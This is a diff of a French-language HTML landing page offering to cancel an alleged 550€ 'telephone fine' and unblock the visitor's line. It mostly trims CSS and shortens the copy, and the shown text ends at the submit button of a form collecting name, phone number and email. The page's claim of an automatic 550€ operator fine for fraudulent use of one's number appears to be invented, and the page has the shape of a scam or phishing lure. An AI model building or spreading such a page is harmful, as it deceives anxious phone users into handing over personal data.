@@ -3,25 +3,20 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Annulation Amende Téléphonique 550€ | Assistance Professionnelle</title>
+    <title>Annulation Amende Téléphonique 550€ | Assistance Rapide</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        /* Reset & Base Styles */
         :root {
             --primary: #4361ee;
             --primary-dark: #3a56d4;
-            --secondary: #3f37c9;
             --accent: #f72585;
             --light: #f8f9fa;
             --dark: #212529;
             --gray: #6c757d;
             --light-gray: #e9ecef;
-            --success: #4cc9f0;
-            --warning: #f8961e;
-            --danger: #ef233c;
-            --border-radius: 12px;
-            --box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
-            --transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
+            --border-radius: 8px;
+            --box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            --transition: all 0.2s ease;
         }
 
         * {
@@ -31,36 +26,28 @@
         }
 
         body {
-            font-family: 'Segoe UI', 'Roboto', 'Helvetica Neue', Arial, sans-serif;
-            line-height: 1.7;
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            line-height: 1.5;
             color: var(--dark);
             background-color: #f5f7ff;
-            overflow-x: hidden;
         }
 
         .container {
-            width: 100%;
-            max-width: 1200px;
+            max-width: 1100px;
             margin: 0 auto;
             padding: 0 20px;
         }
 
-        /* Header Styles */
+        /* Header compact */
         header {
-            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
             color: white;
-            padding: 25px 0;
-            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+            padding: 12px 0;
             position: fixed;
             width: 100%;
             top: 0;
             z-index: 1000;
-            transition: var(--transition);
-        }
-
-        header.scrolled {
-            padding: 15px 0;
-            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.15);
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
         }
 
         .header-container {
@@ -72,16 +59,15 @@
         .logo {
             display: flex;
             align-items: center;
-            font-size: 1.8rem;
-            font-weight: 700;
+            font-size: 1.3rem;
+            font-weight: 600;
             color: white;
             text-decoration: none;
         }
 
         .logo i {
-            margin-right: 12px;
-            font-size: 2rem;
-            color: var(--accent);
+            margin-right: 8px;
+            font-size: 1.5rem;
         }
 
         nav ul {
@@ -90,146 +76,83 @@
         }
 
         nav ul li {
-            margin-left: 30px;
-            position: relative;
+            margin-left: 20px;
         }
 
         nav ul li a {
             color: white;
             text-decoration: none;
+            font-size: 0.95rem;
             font-weight: 500;
-            font-size: 1.1rem;
-            transition: var(--transition);
-            padding: 8px 12px;
+            padding: 6px 10px;
             border-radius: var(--border-radius);
+            transition: var(--transition);
         }
 
         nav ul li a:hover {
             background-color: rgba(255, 255, 255, 0.15);
         }
 
-        nav ul li a.active {
-            background-color: rgba(255, 255, 255, 0.2);
-        }
-
-        .mobile-menu-btn {
-            display: none;
-            background: none;
-            border: none;
-            color: white;
-            font-size: 1.8rem;
-            cursor: pointer;
-        }
-
-        /* Hero Section */
+        /* Hero section compacte */
         .hero {
-            padding: 180px 0 100px;
-            background: linear-gradient(rgba(67, 97, 238, 0.9), rgba(63, 55, 201, 0.9)), url('https://images.unsplash.com/photo-1516321318423-f06f85e504b3?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=1470&q=80') no-repeat center/cover;
+            padding: 100px 0 60px;
+            background: linear-gradient(rgba(67, 97, 238, 0.95), rgba(67, 97, 238, 0.95)), 
+                        url('https://images.unsplash.com/photo-1516321318423-f06f85e504b3?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=800&q=80') no-repeat center/cover;
             color: white;
             text-align: center;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .hero::after {
-            content: '';
-            position: absolute;
-            bottom: 0;
-            left: 0;
-            width: 100%;
-            height: 100px;
-            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1200 120" preserveAspectRatio="none"><path d="M0,0V7.23C0,65.52,268.63,112.77,600,112.77S1200,65.52,1200,7.23V0Z" opacity=".25" fill="%23f5f7ff"></path><path d="M0,0V15.81C13,36.92,27.64,56.86,47.69,72.05,99.41,111.27,165,111,224.58,91.58c31.15-10.15,60.09-26.07,89.67-39.8,40.92-19,84.73-46,130.83-49.67,36.26-2.85,70.9,9.42,98.6,31.56,31.77,25.39,62.32,62,103.63,73,40.44,10.79,81.35-6.69,119.13-24.28s75.16-39,116.92-43.05c59.73-5.85,113.28,22.88,168.9,38.84,30.2,8.66,59,6.17,87.09-7.5,22.43-10.89,48-26.93,60.65-49.24V0Z" opacity=".5" fill="%23f5f7ff"></path><path d="M0,0V5.63C149.93,59,314.09,71.32,475.83,42.57c43-7.64,84.23-20.12,127.61-26.46,59-8.63,112.48,12.24,165.56,35.4C827.93,77.22,886,95.24,951.2,90c86.53-7,172.46-45.71,248.8-84.81V0Z" fill="%23f5f7ff"></path></svg>');
-            background-size: cover;
-            z-index: 1;
-        }
-
-        .hero-content {
-            max-width: 800px;
-            margin: 0 auto;
-            position: relative;
-            z-index: 2;
         }
 
         .hero h1 {
-            font-size: 3.2rem;
-            margin-bottom: 20px;
-            line-height: 1.2;
-            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
-            animation: fadeInDown 1s ease;
+            font-size: 1.8rem;
+            margin-bottom: 15px;
+            line-height: 1.3;
         }
 
         .hero p {
-            font-size: 1.3rem;
-            margin-bottom: 40px;
+            font-size: 1rem;
+            margin-bottom: 25px;
             opacity: 0.9;
-            animation: fadeInUp 1s ease;
+            max-width: 600px;
+            margin-left: auto;
+            margin-right: auto;
         }
 
         .btn {
             display: inline-block;
             background-color: var(--accent);
             color: white;
-            padding: 15px 35px;
-            border-radius: 50px;
+            padding: 10px 25px;
+            border-radius: var(--border-radius);
             text-decoration: none;
-            font-weight: 600;
-            font-size: 1.1rem;
+            font-weight: 500;
+            font-size: 0.95rem;
             transition: var(--transition);
-            box-shadow: 0 5px 15px rgba(247, 37, 133, 0.3);
-            border: none;
-            cursor: pointer;
-            animation: fadeIn 1.5s ease;
+            margin: 5px;
         }
 
         .btn:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 8px 25px rgba(247, 37, 133, 0.4);
-            background-color: #f5177d;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px rgba(247, 37, 133, 0.3);
         }
 
-        .btn-outline {
-            background-color: transparent;
-            border: 2px solid white;
-            margin-left: 15px;
-            box-shadow: none;
-        }
-
-        .btn-outline:hover {
-            background-color: rgba(255, 255, 255, 0.1);
-        }
-
-        /* Problem Section */
+        /* Problem section */
         .section {
-            padding: 100px 0;
+            padding: 60px 0;
         }
 
         .section-title {
             text-align: center;
-            margin-bottom: 60px;
+            margin-bottom: 30px;
         }
 
         .section-title h2 {
-            font-size: 2.5rem;
+            font-size: 1.5rem;
             color: var(--primary);
-            margin-bottom: 20px;
-            position: relative;
-            display: inline-block;
-        }
-
-        .section-title h2::after {
-            content: '';
-            position: absolute;
-            bottom: -10px;
-            left: 50%;
-            transform: translateX(-50%);
-            width: 80px;
-            height: 4px;
-            background-color: var(--accent);
-            border-radius: 2px;
+            margin-bottom: 10px;
         }
 
         .section-title p {
-            font-size: 1.2rem;
+            font-size: 0.95rem;
             color: var(--gray);
             max-width: 700px;
             margin: 0 auto;
@@ -239,96 +162,49 @@
             background-color: white;
             border-radius: var(--border-radius);
             box-shadow: var(--box-shadow);
-            padding: 40px;
-            margin-bottom: 30px;
-            position: relative;
-            overflow: hidden;
-            transition: var(--transition);
-        }
-
-        .problem-card:hover {
-            transform: translateY(-10px);
-            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.15);
-        }
-
-        .problem-card::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 5px;
-            height: 100%;
-            background-color: var(--accent);
+            padding: 25px;
+            margin-bottom: 20px;
+            border-left: 4px solid var(--accent);
         }
 
         .problem-card h3 {
-            font-size: 1.5rem;
-            margin-bottom: 20px;
+            font-size: 1.2rem;
+            margin-bottom: 15px;
             color: var(--primary);
         }
 
         .problem-card ul {
-            margin-bottom: 20px;
             padding-left: 20px;
+            font-size: 0.95rem;
         }
 
         .problem-card ul li {
-            margin-bottom: 10px;
-            position: relative;
+            margin-bottom: 8px;
         }
 
-        .problem-card ul li::before {
-            content: '•';
-            color: var(--accent);
-            font-weight: bold;
-            position: absolute;
-            left: -20px;
-        }
-
-        .icon-box {
-            display: flex;
-            justify-content: center;
-            margin-bottom: 30px;
-        }
-
-        .icon-box i {
-            font-size: 4rem;
-            color: var(--accent);
-            animation: pulse 2s infinite;
-        }
-
-        /* Timeline */
+        /* Timeline compact */
         .timeline {
             position: relative;
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 40px 0;
+            max-width: 800px;
+            margin: 30px auto;
         }
 
         .timeline::after {
             content: '';
             position: absolute;
-            width: 3px;
+            width: 2px;
             background-color: var(--primary);
             top: 0;
             bottom: 0;
             left: 50%;
-            margin-left: -1.5px;
+            margin-left: -1px;
         }
 
         .timeline-item {
-            padding: 10px 40px;
+            padding: 10px 30px;
             position: relative;
             width: 50%;
             box-sizing: border-box;
-            opacity: 0;
-            transform: translateY(50px);
-            transition: all 0.5s ease;
-        }
-
-        .timeline-item.visible {
-            opacity: 1;
-            transform: translateY(0);
         }
 
         .timeline-item:nth-child(odd) {
@@ -340,265 +216,127 @@
         }
 
         .timeline-content {
-            padding: 30px;
+            padding: 20px;
             background-color: white;
             border-radius: var(--border-radius);
             box-shadow: var(--box-shadow);
-            position: relative;
+            font-size: 0.9rem;
         }
 
         .timeline-content h3 {
-            font-size: 1.3rem;
-            margin-bottom: 15px;
+            font-size: 1.1rem;
+            margin-bottom: 8px;
             color: var(--primary);
         }
 
-        .timeline-item::after {
-            content: '';
-            position: absolute;
-            width: 25px;
-            height: 25px;
-            background-color: white;
-            border: 4px solid var(--accent);
-            border-radius: 50%;
-            top: 30px;
-            z-index: 1;
-        }
-
-        .timeline-item:nth-child(odd)::after {
-            right: -12px;
-        }
-
-        .timeline-item:nth-child(even)::after {
-            left: -12px;
-        }
-
-        /* Features */
-        .features {
-            display: flex;
-            flex-wrap: wrap;
-            justify-content: space-between;
-            margin: 50px 0;
-        }
-
-        .feature-card {
-            flex: 0 0 calc(33.333% - 30px);
-            background-color: white;
-            border-radius: var(--border-radius);
-            box-shadow: var(--box-shadow);
-            padding: 40px 30px;
-            margin-bottom: 30px;
-            text-align: center;
-            transition: var(--transition);
-            opacity: 0;
-            transform: translateY(50px);
-        }
-
-        .feature-card.visible {
-            opacity: 1;
-            transform: translateY(0);
-        }
-
-        .feature-card:hover {
-            transform: translateY(-10px) !important;
-            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.15);
-        }
-
-        .feature-icon {
-            width: 80px;
-            height: 80px;
-            background-color: rgba(67, 97, 238, 0.1);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 25px;
-            font-size: 2rem;
-            color: var(--primary);
-            transition: var(--transition);
-        }
-
-        .feature-card:hover .feature-icon {
-            background-color: var(--primary);
-            color: white;
-            transform: rotateY(180deg);
-        }
-
-        .feature-card h3 {
-            font-size: 1.4rem;
-            margin-bottom: 15px;
-            color: var(--primary);
-        }
-
-        /* Form Section */
+        /* Form section compact */
         .form-section {
             background-color: white;
-            padding: 80px 0;
-            position: relative;
-        }
-
-        .form-section::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100px;
-            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1200 120" preserveAspectRatio="none"><path d="M0,0V7.23C0,65.52,268.63,112.77,600,112.77S1200,65.52,1200,7.23V0Z" opacity=".25" fill="%234361ee"></path><path d="M0,0V15.81C13,36.92,27.64,56.86,47.69,72.05,99.41,111.27,165,111,224.58,91.58c31.15-10.15,60.09-26.07,89.67-39.8,40.92-19,84.73-46,130.83-49.67,36.26-2.85,70.9,9.42,98.6,31.56,31.77,25.39,62.32,62,103.63,73,40.44,10.79,81.35-6.69,119.13-24.28s75.16-39,116.92-43.05c59.73-5.85,113.28,22.88,168.9,38.84,30.2,8.66,59,6.17,87.09-7.5,22.43-10.89,48-26.93,60.65-49.24V0Z" opacity=".5" fill="%234361ee"></path><path d="M0,0V5.63C149.93,59,314.09,71.32,475.83,42.57c43-7.64,84.23-20.12,127.61-26.46,59-8.63,112.48,12.24,165.56,35.4C827.93,77.22,886,95.24,951.2,90c86.53-7,172.46-45.71,248.8-84.81V0Z" fill="%234361ee"></path></svg>');
-            background-size: cover;
-            transform: rotate(180deg);
+            padding: 50px 0;
         }
 
         .form-container {
-            max-width: 700px;
+            max-width: 500px;
             margin: 0 auto;
             background-color: white;
             border-radius: var(--border-radius);
-            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.1);
-            padding: 50px;
-            position: relative;
-            z-index: 2;
+            box-shadow: var(--box-shadow);
+            padding: 30px;
         }
 
         .form-title {
             text-align: center;
-            margin-bottom: 40px;
+            margin-bottom: 20px;
         }
 
         .form-title h2 {
-            font-size: 2rem;
+            font-size: 1.4rem;
             color: var(--primary);
-            margin-bottom: 15px;
+            margin-bottom: 8px;
         }
 
         .form-title p {
+            font-size: 0.9rem;
             color: var(--gray);
         }
 
         .form-group {
-            margin-bottom: 25px;
+            margin-bottom: 18px;
         }
 
         .form-group label {
             display: block;
-            margin-bottom: 8px;
-            font-weight: 600;
-            color: var(--dark);
+            margin-bottom: 6px;
+            font-size: 0.9rem;
+            font-weight: 500;
         }
 
         .form-control {
             width: 100%;
-            padding: 15px 20px;
+            padding: 12px 15px;
             border: 1px solid var(--light-gray);
             border-radius: var(--border-radius);
-            font-size: 1rem;
-            transition: var(--transition);
+            font-size: 0.95rem;
             background-color: #f8f9fa;
         }
 
         .form-control:focus {
             border-color: var(--primary);
-            box-shadow: 0 0 0 3px rgba(67, 97, 238, 0.2);
             outline: none;
-            background-color: white;
-        }
-
-        .form-control.invalid {
-            border-color: var(--danger);
-        }
-
-        .error-message {
-            color: var(--danger);
-            font-size: 0.9rem;
-            margin-top: 5px;
-            display: none;
+            box-shadow: 0 0 0 2px rgba(67, 97, 238, 0.2);
         }
 
         .submit-btn {
             width: 100%;
-            padding: 18px;
+            padding: 14px;
             background-color: var(--primary);
             color: white;
             border: none;
             border-radius: var(--border-radius);
-            font-size: 1.1rem;
-            font-weight: 600;
+            font-weight: 500;
             cursor: pointer;
             transition: var(--transition);
-            box-shadow: 0 5px 15px rgba(67, 97, 238, 0.3);
-            position: relative;
-            overflow: hidden;
         }
 
         .submit-btn:hover {
             background-color: var(--primary-dark);
-            transform: translateY(-3px);
-            box-shadow: 0 8px 25px rgba(67, 97, 238, 0.4);
         }
 
-        .submit-btn:active {
-            transform: translateY(1px);
-        }
-
-        .submit-btn.loading::after {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(255, 255, 255, 0.3);
-            animation: loading 1.5s infinite;
-        }
-
-        /* FAQ */
+        /* FAQ compact */
         .faq-item {
             background-color: white;
             border-radius: var(--border-radius);
             box-shadow: var(--box-shadow);
-            padding: 30px;
-            margin-bottom: 20px;
-            transition: var(--transition);
-        }
-
-        .faq-item:hover {
-            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            margin-bottom: 15px;
         }
 
         .faq-question {
-            font-size: 1.3rem;
+            font-size: 1rem;
             color: var(--primary);
-            margin-bottom: 15px;
+            margin-bottom: 10px;
             cursor: pointer;
             display: flex;
             justify-content: space-between;
-            align-items: center;
-        }
-
-        .faq-question i {
-            transition: var(--transition);
         }
 
         .faq-answer {
+            font-size: 0.9rem;
             max-height: 0;
             overflow: hidden;
             transition: max-height 0.3s ease;
         }
 
         .faq-item.active .faq-answer {
-            max-height: 500px;
+            max-height: 300px;
         }
 
-        .faq-item.active .faq-question i {
-            transform: rotate(180deg);
-        }
-
-        /* Footer */
+        /* Footer compact */
         footer {
             background-color: var(--dark);
             color: white;
-            padding: 80px 0 30px;
-            position: relative;
+            padding: 40px 0 20px;
+            font-size: 0.9rem;
         }
 
         .footer-content {
@@ -608,30 +346,15 @@
         }
 
         .footer-column {
-            flex: 0 0 calc(33.333% - 30px);
-            margin-bottom: 40px;
+            flex: 0 0 48%;
+            margin-bottom: 25px;
         }
 
         .footer-column h3 {
-            font-size: 1.4rem;
-            margin-bottom: 25px;
-            position: relative;
-            padding-bottom: 15px;
-        }
-
-        .footer-column h3::after {
-            content: '';
-            position: absolute;
-            bottom: 0;
-            left: 0;
-            width: 50px;
-            height: 3px;
-            background-color: var(--accent);
-        }
-
-        .footer-column p {
-            margin-bottom: 20px;
-            opacity: 0.8;
+            font-size: 1.1rem;
+            margin-bottom: 15px;
+            padding-bottom: 8px;
+            border-bottom: 2px solid var(--accent);
         }
 
         .footer-links {
@@ -639,7 +362,7 @@
         }
 
         .footer-links li {
-            margin-bottom: 12px;
+            margin-bottom: 8px;
         }
 
         .footer-links a {
@@ -647,162 +370,29 @@
             text-decoration: none;
             opacity: 0.8;
             transition: var(--transition);
-            display: block;
         }
 
         .footer-links a:hover {
             opacity: 1;
-            padding-left: 5px;
-        }
-
-        .social-links {
-            display: flex;
-            margin-top: 20px;
-        }
-
-        .social-links a {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            width: 40px;
-            height: 40px;
-            background-color: rgba(255, 255, 255, 0.1);
-            border-radius: 50%;
-            margin-right: 10px;
-            color: white;
-            transition: var(--transition);
-        }
-
-        .social-links a:hover {
-            background-color: var(--accent);
-            transform: translateY(-3px);
         }
 
         .copyright {
             text-align: center;
-            padding-top: 30px;
-            margin-top: 30px;
+            padding-top: 20px;
+            margin-top: 20px;
             border-top: 1px solid rgba(255, 255, 255, 0.1);
+            font-size: 0.8rem;
             opacity: 0.7;
-            font-size: 0.9rem;
         }
 
-        /* Loading Overlay */
-        .loading-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(255, 255, 255, 0.95);
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            z-index: 9999;
-            opacity: 0;
-            pointer-events: none;
-            transition: opacity 0.3s ease;
-        }
-
-        .loading-overlay.active {
-            opacity: 1;
-            pointer-events: all;
-        }
-
-        .loading-spinner {
-            width: 70px;
-            height: 70px;
-            border: 8px solid #f3f3f3;
-            border-top: 8px solid var(--primary);
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin-bottom: 20px;
-        }
-
-        .loading-text {
-            font-size: 1.2rem;
-            color: var(--dark);
-            font-weight: 500;
-        }
-
-        /* Floating Action Button */
-        .fab {
-            position: fixed;
-            bottom: 30px;
-            right: 30px;
-            width: 60px;
-            height: 60px;
-            background-color: var(--accent);
-            color: white;
-            border-radius: 50%;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            font-size: 1.5rem;
-            box-shadow: 0 5px 20px rgba(247, 37, 133, 0.3);
-            cursor: pointer;
-            z-index: 99;
-            transition: var(--transition);
-        }
-
-        .fab:hover {
-            transform: scale(1.1) translateY(-5px);
-            box-shadow: 0 8px 25px rgba(247, 37, 133, 0.4);
-        }
-
-        /* Animations */
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
-        }
-
-        @keyframes fadeInDown {
-            from {
-                opacity: 0;
-                transform: translateY(-30px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        @keyframes fadeInUp {
-            from {
-                opacity: 0;
-                transform: translateY(30px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.1); }
-            100% { transform: scale(1); }
-        }
-
-        @keyframes loading {
-            0% { transform: translateX(-100%); }
-            100% { transform: translateX(100%); }
-        }
-
-        /* Responsive Styles */
-        @media (max-width: 992px) {
-            .feature-card {
-                flex: 0 0 calc(50% - 20px);
+        /* Responsive */
+        @media (max-width: 768px) {
+            .hero {
+                padding: 80px 0 40px;
             }
             
-            .footer-column {
-                flex: 0 0 calc(50% - 20px);
+            .hero h1 {
+                font-size: 1.5rem;
             }
             
             .timeline::after {
@@ -811,635 +401,250 @@
             
             .timeline-item {
                 width: 100%;
-                padding-left: 70px;
-                padding-right: 25px;
+                padding-left: 60px;
+                padding-right: 20px;
             }
             
             .timeline-item:nth-child(even) {
                 left: 0;
             }
             
-            .timeline-item::after {
-                left: 18px !important;
-            }
-            
-            .timeline-item:nth-child(odd) .timeline-content::before {
-                right: auto;
-                left: -15px;
-                border-width: 15px 15px 15px 0;
-                border-color: transparent white transparent transparent;
-            }
-        }
-
-        @media (max-width: 768px) {
-            .hero h1 {
-                font-size: 2.5rem;
-            }
-            
-            .hero p {
-                font-size: 1.1rem;
-            }
-            
-            .mobile-menu-btn {
-                display: block;
-            }
-            
-            nav {
-                position: fixed;
-                top: 80px;
-                left: 0;
-                width: 100%;
-                background-color: var(--primary-dark);
-                padding: 20px;
-                box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
-                transform: translateY(-150%);
-                transition: transform 0.3s ease;
-                z-index: 999;
-            }
-            
-            nav.active {
-                transform: translateY(0);
-            }
-            
-            nav ul {
-                flex-direction: column;
-            }
-            
-            nav ul li {
-                margin: 0 0 15px 0;
-            }
-            
-            .form-container {
-                padding: 30px;
+            .footer-column {
+                flex: 0 0 100%;
             }
         }
 
         @media (max-width: 576px) {
-            .hero {
-                padding: 150px 0 80px;
+            .header-container {
+                flex-direction: column;
+                text-align: center;
             }
             
-            .hero h1 {
-                font-size: 2rem;
+            nav ul {
+                margin-top: 15px;
+                justify-content: center;
             }
             
-            .feature-card, .footer-column {
-                flex: 0 0 100%;
+            nav ul li {
+                margin: 0 8px;
             }
             
             .form-container {
-                padding: 25px 20px;
-            }
-            
-            .section-title h2 {
-                font-size: 2rem;
+                padding: 20px;
             }
         }
     </style>
 </head>
 <body>
-    <!-- Header -->
-    <header id="header">
+    <!-- Header compact -->
+    <header>
         <div class="container header-container">
             <a href="#" class="logo">
                 <i class="fas fa-mobile-alt"></i>
-                <span>AmendeTelecom</span>
+                <span>Amende550</span>
             </a>
             
-            <button class="mobile-menu-btn" id="mobileMenuBtn">
-                <i class="fas fa-bars"></i>
-            </button>
-            
-            <nav id="nav">
+            <nav>
                 <ul>
-                    <li><a href="#problem" class="active">Le Problème</a></li>
-                    <li><a href="#process">Le Processus</a></li>
-                    <li><a href="#solution">Notre Solution</a></li>
+                    <li><a href="#problem">Problème</a></li>
+                    <li><a href="#process">Processus</a></li>
                     <li><a href="#form">Formulaire</a></li>
-                    <li><a href="#faq">FAQ</a></li>
                 </ul>
             </nav>
         </div>
     </header>
 
-    <!-- Hero Section -->
+    <!-- Hero section compacte -->
     <section class="hero">
-        <div class="container hero-content">
-            <h1>Annulation d'Amende Téléphonique de 550€</h1>
-            <p>Vous avez reçu une amende injustifiée de 550€ sur votre ligne téléphonique ? Nous vous aidons à contester cette pénalité et à retrouver l'accès à votre numéro.</p>
-            <div>
-                <a href="#form" class="btn">Demander une Annulation</a>
-                <a href="#problem" class="btn btn-outline">En savoir plus</a>
-            </div>
+        <div class="container">
+            <h1>Annulation d'Amende Téléphonique 550€</h1>
+            <p>Solution rapide pour contester votre amende et débloquer votre ligne</p>
+            <a href="#form" class="btn">Demander aide maintenant</a>
         </div>
     </section>
 
-    <!-- Problem Section -->
+    <!-- Problem section -->
     <section class="section" id="problem">
         <div class="container">
             <div class="section-title">
-                <h2>Avez-vous reçu une amende de 550€ ?</h2>
-                <p>De nombreux utilisateurs se voient infliger une amende injustifiée suite à des activités frauduleuses liées à leur numéro de téléphone.</p>
-            </div>
-            
-            <div class="icon-box">
-                <i class="fas fa-exclamation-triangle"></i>
+                <h2>Votre numéro est bloqué avec une amende de 550€ ?</h2>
+                <p>Nous comprenons votre situation et avons une solution efficace</p>
             </div>
             
             <div class="problem-card">
-                <h3>Votre numéro a été bloqué sans avertissement ?</h3>
-                <p>On vous a informé que 550€ seront facturés au titulaire du numéro ? Si c'est votre problème, vous avez besoin de lever cette restriction, car de nombreuses personnes ont été confrontées au même problème.</p>
-                
-                <h4 style="margin: 25px 0 15px;">Symptômes courants :</h4>
+                <h3>Pourquoi mon numéro a-t-il été bloqué ?</h3>
                 <ul>
-                    <li>Votre numéro de téléphone a été bloqué sans avertissement</li>
-                    <li>Vous avez reçu une notification concernant une amende de 550€</li>
-                    <li>Votre ligne a été restreinte même si vous n'avez rien fait de mal</li>
-                    <li>L'opérateur vous informe que votre numéro a été utilisé pour des activités frauduleuses</li>
+                    <li>Activité suspecte détectée sur votre ligne</li>
+                    <li>Utilisation frauduleuse de votre numéro</li>
+                    <li>Amende automatique de 550€ appliquée</li>
+                    <li>Restriction immédiate de votre service</li>
                 </ul>
             </div>
         </div>
     </section>
 
-    <!-- Process Section -->
-    <section class="section bg-light" id="process">
+    <!-- Process section -->
+    <section class="section" id="process">
         <div class="container">
             <div class="section-title">
-                <h2>Comment cela arrive-t-il ?</h2>
-                <p>Découvrez le processus qui conduit à la restriction de votre ligne téléphonique.</p>
+                <h2>Comment résoudre ce problème ?</h2>
+                <p>Notre processus simple en 4 étapes</p>
             </div>
             
             <div class="timeline">
                 <div class="timeline-item">
                     <div class="timeline-content">
-                        <h3>Étape 1 : Détection de l'activité frauduleuse</h3>
-                        <p>L'opérateur détecte une activité suspecte associée à votre numéro de téléphone, souvent liée à des appels ou SMS frauduleux.</p>
+                        <h3>1. Analyse de votre cas</h3>
+                        <p>Évaluation rapide de votre situation</p>
                     </div>
                 </div>
                 
                 <div class="timeline-item">
                     <div class="timeline-content">
-                        <h3>Étape 2 : Restriction de la ligne</h3>
-                        <p>Votre ligne est immédiatement bloquée pour empêcher d'autres activités frauduleuses et protéger les autres utilisateurs.</p>
+                        <h3>2. Préparation du dossier</h3>
+                        <p>Collecte des documents nécessaires</p>
                     </div>
                 </div>
                 
                 <div class="timeline-item">
                     <div class="timeline-content">
-                        <h3>Étape 3 : Notification d'amende</h3>
-                        <p>Vous recevez une notification vous informant d'une amende de 550€ qui sera facturée sur votre prochaine facture.</p>
+                        <h3>3. Envoi à l'opérateur</h3>
+                        <p>Transmission officielle de la contestation</p>
                     </div>
                 </div>
                 
                 <div class="timeline-item">
                     <div class="timeline-content">
-                        <h3>Étape 4 : Paiement ou contestation</h3>
-                        <p>Vous devez soit payer l'amende, soit engager une procédure de contestation pour prouver votre bonne foi.</p>
+                        <h3>4. Suivi jusqu'au déblocage</h3>
+                        <p>Accompagnement jusqu'à la résolution</p>
                     </div>
                 </div>
             </div>
         </div>
     </section>
 
-    <!-- Solution Section -->
-    <section class="section" id="solution">
-        <div class="container">
-            <div class="section-title">
-                <h2>Notre Solution</h2>
-                <p>Nous vous accompagnons dans toutes les étapes de la contestation de votre amende téléphonique.</p>
-            </div>
-            
-            <div class="features">
-                <div class="feature-card">
-                    <div class="feature-icon">
-                        <i class="fas fa-search"></i>
-                    </div>
-                    <h3>Analyse Complète</h3>
-                    <p>Nous examinons en détail votre situation pour comprendre comment votre numéro a été compromis et utilisé à des fins frauduleuses.</p>
-                </div>
-                
-                <div class="feature-card">
-                    <div class="feature-icon">
-                        <i class="fas fa-file-alt"></i>
-                    </div>
-                    <h3>Dossier de Contestation</h3>
-                    <p>Nous préparons tous les documents nécessaires pour contester officiellement l'amende auprès de votre opérateur téléphonique.</p>
-                </div>
-                
-                <div class="feature-card">
-                    <div class="feature-icon">
-                        <i class="fas fa-gavel"></i>
-                    </div>
-                    <h3>Procédure Officielle</h3>
-                    <p>Nous engageons toutes les démarches administratives et juridiques nécessaires pour annuler l'amende et débloquer votre ligne.</p>
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <!-- Form Section -->
+    <!-- Form section -->
     <section class="form-section" id="form">
         <div class="container">
             <div class="form-container">
                 <div class="form-title">
-                    <h2>Demande d'Annulation d'Amende</h2>
-                    <p>Remplissez ce formulaire pour initier la procédure de contestation de votre amende de 550€.</p>
+                    <h2>Formulaire de demande</h2>
+                    <p>Remplissez ces informations pour commencer le processus</p>
                 </div>
                 
                 <form id="penaltyForm">
                     <div class="form-group">
-                        <label for="username">Nom Complet <small>(tel que sur votre contrat)</small></label>
+                        <label for="username">Nom complet</label>
                         <input type="text" id="username" class="form-control" required>
-                        <div class="error-message" id="usernameError">Veuillez entrer votre nom complet</div>
                     </div>
                     
                     <div class="form-group">
-                        <label for="phone">Numéro de Téléphone <small>(format: +33 ou 0XXXXXXXXX)</small></label>
-                        <input type="tel" id="phone" class="form-control" required>
-                        <div class="error-message" id="phoneError">Veuillez entrer un numéro de téléphone valide</div>
+                        <label for="phone">Numéro de téléphone</label>
+                        <input type="tel" id="phone" class="form-control" required placeholder="+33 ou 0XXXXXXXXX">
                     </div>
                     
                     <div class="form-group">
-                        <label for="email">Adresse Email</label>
+                        <label for="email">Adresse email</label>
                         <input type="email" id="email" class="form-control" required>
-                        <div class="error-message" id="emailError">Veuillez entrer une adresse email valide</div>
                     </div>
                     
-                    <button type="submit" class="submit-btn" id="submitBtn">
